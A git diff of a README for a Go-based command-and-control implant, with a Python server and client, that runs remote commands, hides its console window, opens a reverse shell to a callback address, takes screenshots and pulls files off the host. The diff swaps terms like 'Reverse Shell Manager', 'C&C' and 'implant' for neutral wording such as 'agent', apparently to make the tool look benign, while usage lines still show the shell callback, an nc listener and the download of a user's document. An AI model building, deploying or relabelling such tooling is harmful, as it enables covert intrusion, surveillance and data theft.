@@ -1,14 +1,14 @@
 # cc-agent
-# Project Title: Go Reverse Shell Manager
+# Project Title: Agent 
 
 ## Overview
 
-The Go Reverse Shell Manager is a comprehensive solution designed to facilitate remote command execution and management through a Go-based agent. This system allows for executing predefined or dynamic commands received from a server, with the capability to initiate a reverse shell session for in-depth interaction. This README provides an overview of the project, including setup instructions, usage examples, and important security considerations.
+The agent is a comprehensive solution designed to facilitate remote command execution and management through a Go-based agent. This system allows for executing predefined or dynamic commands received from a server, with the capability to initiate a shell session for in-depth interaction. This README provides an overview of the project, including setup instructions, usage examples, and important security considerations.
 
 ## Features
 
 - **Remote Command Execution**: Execute commands received from a centralized server.
-- **Reverse Shell Capability**: Open a reverse shell to a specified listener, allowing for interactive command execution.
+- **Shell Capability**: Open a reverse shell to a specified listener, allowing for interactive command execution.
 - **Result Reporting**: Automatically sends the execution results of commands back to the server.
 - **Hide Console Window**: Optionally runs without a visible console window to reduce footprint on the host system.
 - **Download file on the remote host**: Download file from the host where the agent is running
@@ -31,7 +31,7 @@ The Go Reverse Shell Manager is a comprehensive solution designed to facilitate 
 ```
 
 2. **Build the agent**
-Before building the agent you will need to replace in the code the serverUrl  with your endpoint configuration. TheserverURL is the endpoint of your C&C. You can use a dns name for both to faciliate ip rotation.
+Before building the agent you will need to replace in the code the serverUrl  with your endpoint configuration. TheserverURL is the endpoint of your server agent. You can use a dns name for both to faciliate ip rotation.
 ```go
 var (
     mu               sync.Mutex
@@ -45,7 +45,7 @@ Than you can build the agent.
 go build -o go-agent.exe main.go
 ```
 
-3. ** Start the C&C **
+3. ** Start the agent server **
 Ensure your Python environment is set up, then run:
 ```bash
 python server.py
@@ -77,13 +77,13 @@ You just need to:
 4. run it ```bash ./build.sh```
 
 ## Executing Commands Remotely
-The implant support the execution of remote command. You can execute the command and retrieve the result of the command.
+The agent support the execution of remote command. You can execute the command and retrieve the result of the command.
 Use the Python client to submit commands to the server:
 ```bash
 python client.py --command "ipconfig"
 ```
 
-To initiate a reverse shell session, submit the special "shell" command:
+To initiate a shell session, submit the special "shell" command:
 Replace the ip after the shell with your call back ip the port can be changed too.
 ```bash
 python client.py --command "shell 192.168.56.101:4444"
@@ -94,8 +94,14 @@ Ensure you have a listener running on the specified port before initiating the r
 nc -lvp 4444
 ```
 
+## Collect agent command results
+An id will be provided once a command has be run using the client. To retrieve the command results use the following command:
+```bash
+python client.py --get_result "1"
+```
+
 ### Download file from the remote host
-The C&C support downloading file from the remote host.
+The agent support downloading file from the remote host.
 To initiate a file to be downloaded just specify the path to the file on the remote host and the filename:
 ```bash
 python client.py --command "download c:\Users\vboxuser\Desktop\document.docx document.docx"
@@ -103,7 +109,7 @@ python client.py --command "download c:\Users\vboxuser\Desktop\document.docx doc
 The file will be downloaded on the C&C server and stored on inside a local folder named received_file.
 
 ### Take a screenshot on the remote host
-The C&C support taking a screenshot
+The agent support taking a screenshot
 To initiate take a screenshot just type:
 ```bash
 python client.py --command "screenshot"
